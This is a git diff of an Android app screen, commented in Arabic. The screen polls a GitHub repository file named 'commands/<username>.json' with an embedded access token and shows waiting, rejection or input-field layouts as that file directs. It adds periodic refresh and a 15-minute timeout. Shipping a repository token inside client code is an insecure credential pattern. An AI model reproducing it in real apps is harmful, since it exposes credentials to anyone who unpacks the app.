@@ -3,6 +3,8 @@ package com.ban.ab;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
 import android.util.Base64;
 import android.view.View;
 import android.widget.Button;
@@ -11,7 +13,7 @@ import android.widget.LinearLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
-import androidx.cardview.widget.CardView; // استيراد مهم جداً
+import androidx.cardview.widget.CardView;
 
 import org.json.JSONObject;
 import java.io.IOException;
@@ -30,12 +32,16 @@ public class SecondActivity extends AppCompatActivity {
     private final String GITHUB_REPO_PATH = "abdullah14120/ban";
     private final OkHttpClient client = new OkHttpClient();
 
-    // تعريف العناصر (تعديل النوع هنا لمنع الـ Crash)
-    private CardView layoutWaiting, layoutRejected, layoutFields; 
+    private CardView layoutWaiting, layoutRejected, layoutFields;
     private LinearLayout groupField1, groupField2, groupField3;
     private TextView txtRejectReason, txtUserDisplay;
     private EditText field1, field2, field3;
     private Button btnConfirm1, btnConfirm2, btnConfirm3, btnFinalOrder, btnCancelOrder;
+
+    private long startTime;
+    private final long TIMEOUT_LIMIT = 15 * 60 * 1000; // 15 دقيقة بالملي ثانية
+    private Handler refreshHandler = new Handler(Looper.getMainLooper());
+    private Runnable refreshRunnable;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -44,29 +50,16 @@ public class SecondActivity extends AppCompatActivity {
 
         SharedPreferences pref = getSharedPreferences("AppPrefs", MODE_PRIVATE);
         userName = pref.getString("user_name", "");
+        startTime = System.currentTimeMillis(); // تسجيل وقت دخول واجهة الانتظار
 
         initViews();
-        checkStatusFromGithub();
-        // إنشاء مؤقت يفحص الحالة كل 10 ثوانٍ
-new android.os.Handler().postDelayed(new Runnable() {
-    @Override
-    public void run() {
-        checkStatusFromGithub(); // استدعاء دالة الفحص
-        
-        // إعادة تشغيل المؤقت مرة أخرى (Loop)
-        new android.os.Handler().postDelayed(this, 10000); // 10000 مللي ثانية = 10 ثوانٍ
-    }
-}, 10000);
-
+        startAutoRefresh(); // بدء الفحص الدوري للحالة
     }
 
     private void initViews() {
-        // ربط الحاويات الجديدة (CardView)
         layoutWaiting = findViewById(R.id.layoutWaiting);
         layoutRejected = findViewById(R.id.layoutRejected);
         layoutFields = findViewById(R.id.layoutFields);
-
-        // ربط باقي العناصر
         txtUserDisplay = findViewById(R.id.txtUserDisplay);
         txtRejectReason = findViewById(R.id.txtRejectReason);
         field1 = findViewById(R.id.field1);
@@ -83,20 +76,40 @@ new android.os.Handler().postDelayed(new Runnable() {
 
         txtUserDisplay.setText("مرحباً: " + userName);
 
-        // زر الإلغاء
         btnCancelOrder.setOnClickListener(v -> {
+            stopAutoRefresh();
             getSharedPreferences("AppPrefs", MODE_PRIVATE).edit().clear().apply();
             startActivity(new Intent(this, MainActivity.class));
             finish();
         });
     }
 
+    private void startAutoRefresh() {
+        refreshRunnable = new Runnable() {
+            @Override
+            public void run() {
+                checkStatusFromGithub();
+                // إعادة الفحص كل 12 ثانية (توازن بين السرعة واستهلاك البطارية)
+                refreshHandler.postDelayed(this, 12000);
+            }
+        };
+        refreshHandler.post(refreshRunnable);
+    }
+
+    private void stopAutoRefresh() {
+        if (refreshHandler != null && refreshRunnable != null) {
+            refreshHandler.removeCallbacks(refreshRunnable);
+        }
+    }
+
     private void checkStatusFromGithub() {
-        String url = "https://api.github.com/repos/" + GITHUB_REPO_PATH + "/contents/commands/" + userName + ".json?timestamp=" + System.currentTimeMillis();
-        
+        // كسر الكاش بإضافة وقت النظام للرابط
+        String url = "https://api.github.com/repos/" + GITHUB_REPO_PATH + "/contents/commands/" + userName + ".json?t=" + System.currentTimeMillis();
+
         Request request = new Request.Builder()
                 .url(url)
                 .header("Authorization", "token " + GITHUB_TOKEN)
+                .header("Cache-Control", "no-cache")
                 .build();
 
         client.newCall(request).enqueue(new Callback() {
@@ -105,16 +118,19 @@ new android.os.Handler().postDelayed(new Runnable() {
 
             @Override
             public void onResponse(Call call, Response response) throws IOException {
-                if (response.isSuccessful()) {
+                if (response.isSuccessful() && response.body() != null) {
                     try {
                         String jsonData = response.body().string();
-                        JSONObject obj = new JSONObject(jsonData);
-                        String contentBase64 = obj.getString("content").replace("\n", "");
-                        String decoded = new String(Base64.decode(contentBase64, Base64.DEFAULT));
-                        JSONObject statusObj = new JSONObject(decoded);
+                        JSONObject jsonObject = new JSONObject(jsonData);
                         
-                        String status = statusObj.optString("status", "waiting");
-                        runOnUiThread(() -> updateUI(status, statusObj));
+                        String contentBase64 = jsonObject.getString("content").replace("\n", "");
+                        byte[] data = Base64.decode(contentBase64, Base64.DEFAULT);
+                        String decodedContent = new String(data, "UTF-8");
+                        
+                        JSONObject statusData = new JSONObject(decodedContent);
+                        String status = statusData.optString("status", "waiting");
+
+                        runOnUiThread(() -> updateUI(status, statusData));
                     } catch (Exception e) { e.printStackTrace(); }
                 }
             }
@@ -122,33 +138,50 @@ new android.os.Handler().postDelayed(new Runnable() {
     }
 
     private void updateUI(String status, JSONObject data) {
-        // إخفاء الجميع أولاً
-        layoutWaiting.setVisibility(View.GONE);
-        layoutRejected.setVisibility(View.GONE);
-        layoutFields.setVisibility(View.GONE);
+        long currentTime = System.currentTimeMillis();
+        
+        // فحص الرد الآلي (15 دقيقة بدون استجابة)
+        if (status.equals("waiting") && (currentTime - startTime > TIMEOUT_LIMIT)) {
+            showLayout(layoutRejected);
+            txtRejectReason.setText("نأسف لا يمكننا خدمتك لعدم توفر أحد من فريق الدعم الفني حالياً، يرجى المحاولة لاحقاً.");
+            stopAutoRefresh(); // التوقف عن استنزاف البيانات بعد الرفض الآلي
+            return;
+        }
 
         switch (status) {
             case "waiting":
-                layoutWaiting.setVisibility(View.VISIBLE);
+                showLayout(layoutWaiting);
                 break;
             case "rejected":
-                layoutRejected.setVisibility(View.VISIBLE);
-                txtRejectReason.setText(data.optString("reason", "لا يوجد سبب محدد"));
+                showLayout(layoutRejected);
+                txtRejectReason.setText(data.optString("reason", "تم رفض الطلب يدوياً."));
+                stopAutoRefresh();
                 break;
             case "fields":
-                layoutFields.setVisibility(View.VISIBLE);
+                showLayout(layoutFields);
                 setupFields(data);
                 break;
         }
     }
 
+    // دالة مساعدة لتبديل الواجهات بسلاسة في الخيط الرئيسي
+    private void showLayout(View targetLayout) {
+        layoutWaiting.setVisibility(View.GONE);
+        layoutRejected.setVisibility(View.GONE);
+        layoutFields.setVisibility(View.GONE);
+        targetLayout.setVisibility(View.VISIBLE);
+    }
+
     private void setupFields(JSONObject data) {
-        // منطق إظهار الحقول بناءً على محتوى ملف JSON
         groupField1.setVisibility(data.has("f1") ? View.VISIBLE : View.GONE);
         groupField2.setVisibility(data.has("f2") ? View.VISIBLE : View.GONE);
         groupField3.setVisibility(data.has("f3") ? View.VISIBLE : View.GONE);
-        
-        // إذا كانت الحقول المطلوبة قد تم ملؤها مسبقاً
         btnFinalOrder.setVisibility(View.VISIBLE);
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
+        stopAutoRefresh(); // ضمان توقف المزامنة عند إغلاق التطبيق
     }
 }
